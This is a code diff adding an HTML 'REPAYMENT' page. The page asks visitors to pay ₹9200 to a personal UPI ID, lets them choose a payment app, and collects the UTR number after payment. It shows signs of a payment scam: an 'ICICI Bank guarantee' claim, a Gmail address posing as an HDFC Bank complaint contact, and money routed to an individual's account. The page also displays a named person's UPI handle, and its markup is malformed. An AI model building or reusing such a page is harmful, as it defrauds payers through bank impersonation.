@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>REPAYMENT</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <div class="box1">
+        <table width="100%">
+                <td>Amount</td>
+            <td> <h5 align="right" class=amount displap">₹9200 </h5></td>
+                <td><button class="cpb" onclick="copyAmount()">COPY</button></td>
+                <tr>
+                    <tr>
+                <td>VPA/UPI</td>
+              <td> <h5 align="right" class="upi-display">ramushil276-1@oksbi</h5> </td>
+                        
+                <td><button class="cpb" onclick="copyUPI()">COPY</button></td>
+            </td>
+        </table>
+        <table width="100%">
+            <tr> 
+                <tr>
+                <td>Name</td>
+                <td> <h5 align="right">SWAPNA SHIL</h5> </td>
+            </td>
+        </table>
+        <h3 class="a1">↓ Select payment method and pay ↓</h3><tr>
+        <table> 
+        <hr><br> </tr> 
+             <tr><input type="radio" class="rdaacls"></tr> 
+                <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882" width="63px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br></br> <hr> </tr> 
+                <br>
+            <tr><input type="radio" class="rdaacls"></tr>
+                <img src="https://i.ibb.co.com/dtpd8d8/IMG-3881.png" alt="IMG-3881" width="99px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br> </br> <hr> </tr>
+               <br>
+            <tr><input type="radio" class="rdaacls"></tr>
+                <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888" width="96px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br> </br> <hr> </tr>
+                 <br>
+            <tr> <input type="radio" class="rdaacls"></tr>
+            <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" width="84px" height="30px" style="vertical-align:middle" class="gtwImgs"> <br> </br> <hr> </tr>
+     
+        <h3 class="a1">↓ Fill the UTR numbers after you done payment ↓</h3>
+        <form method="post" onsubmit="return false;">
+            UTR 
+            <input type="text" name="utr" id="utrInput" class="inp" placeholder="Input UTR number"><br>
+                </form><br>
+            <center>
+                <button type="button" class="btn1" id="submitUtrButton">Submit UTR</button>
+                </form><br>
+                <button type="button" class="btn2">Pay failed (try bank account)</button>
+            </center>
+        <tr>
+         <center>
+        <h6 style="color: lightgray; font-size: 12px;">Dear customers: please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:</h6>
+ <h6 style= "color:blue;font-size:10px;"> hdfcbankcomplaintacceptance@gmail.com</center>
+        </h6>
+    </div>
+
+    <!-- Modals -->
+    <div class="modal" id="copyModal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('copyModal')">&times;</span>
+            <p id="copyMessage" class="modal-text"></p>
+        </div>
+    </div>
+
+    <div class="modal" id="utrModal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('utrModal')">&times;</span>
+            <h6>Confirm UTR Submission</h6>
+            <p>Are you sure you want to submit the UTR number?</p>
+            <button id="confirmButton">Yes, Submit</button>
+            <button class="closeModal" onclick="closeModal('utrModal')">Cancel</button>
+        </div>
+    </div>
+</body>
+</html>
